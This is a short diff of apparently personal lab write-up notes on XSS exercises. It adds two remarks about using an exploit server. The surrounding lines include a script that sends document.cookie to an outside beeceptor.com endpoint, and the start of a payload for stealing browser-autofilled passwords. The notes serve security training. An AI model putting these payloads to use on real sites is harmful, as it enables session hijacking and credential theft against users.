@@ -221,6 +221,8 @@ ${alert(1)}
 Comment body is vuln to XSS.
 
 First solution using https://beeceptor.com/ (blocked by Burp WAF probably)
+[NOTE FROM THE FUTURE: Maybe Exploit Server with Access logs could have been used]
+
 ```
 <script>
     fetch('https://aaaaaa.free.beeceptor.com?q=' + document.cookie, {mode: 'no-cors'})
@@ -250,6 +252,7 @@ Then read the token of impersonated user from `postId = 1`
 The goal here is to steal password that will be autofilled by browser / password managers in this website.
 
 First solution using https://beeceptor.com/ (blocked by Burp WAF probably)
+[NOTE FROM THE FUTURE: Maybe Exploit Server with Access logs could have been used] 
 
 ```
 <input name=username id=username>
